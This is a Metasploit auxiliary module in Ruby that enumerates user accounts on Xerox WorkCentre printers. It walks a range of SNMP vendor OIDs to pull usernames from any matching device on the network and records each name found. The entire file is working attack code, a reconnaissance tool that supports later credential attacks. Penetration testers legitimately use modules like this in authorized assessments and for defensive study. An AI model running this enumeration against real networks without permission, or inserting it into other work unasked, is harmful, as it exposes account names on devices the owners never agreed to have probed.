##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'English'
class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::SNMPClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name' => 'Xerox WorkCentre User Enumeration (SNMP)',
      'Description' => %q{
          This module will do user enumeration based on the Xerox WorkCentre present on the network.
          SNMP is used to extract the usernames.
      },
      'Author' => [
        'pello <fropert[at]packetfault.org>'
      ],
      'License' => MSF_LICENSE,
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'SideEffects' => [],
        'Reliability' => []
      }
    )
  end

  def run_host(ip)
    snmp = connect_snmp

    sys_desc = snmp.get_value('sysDescr.0')

    unless sys_desc =~ /Xerox/
      print_error("#{ip} is not Xerox: #{sys_desc}")
      return
    end

    @users = []
    285_222_001.upto(285_222_299) do |oidusernames|
      snmp.walk("1.3.6.1.4.1.253.8.51.5.1.1.4.151.#{oidusernames}") do |row|
        row.each do |val|
          next if val.nil?
          next if val.value.blank?

          @users << val.value.to_s
        end
      end
    end

    print_good("#{ip} Found Users: #{@users.uniq.sort.join(', ')} ")

    @users.each do |user|
      report_note(
        host: rhost,
        port: datastore['RPORT'],
        proto: 'udp',
        sname: 'snmp',
        update: :unique_data,
        type: 'xerox.workcenter.user',
        data: { user: user }
      )
    end
  rescue ::Rex::ConnectionError, ::SNMP::RequestTimeout
    # No need to make noise about timeouts
  rescue ::SNMP::UnsupportedVersion => e
    vprint_error(e.message)
  rescue ::Interrupt
    raise $ERROR_INFO
  rescue StandardError => e
    print_error("#{ip} Error: #{e.class} #{e} #{e.backtrace}")
  ensure
    disconnect_snmp
  end
end
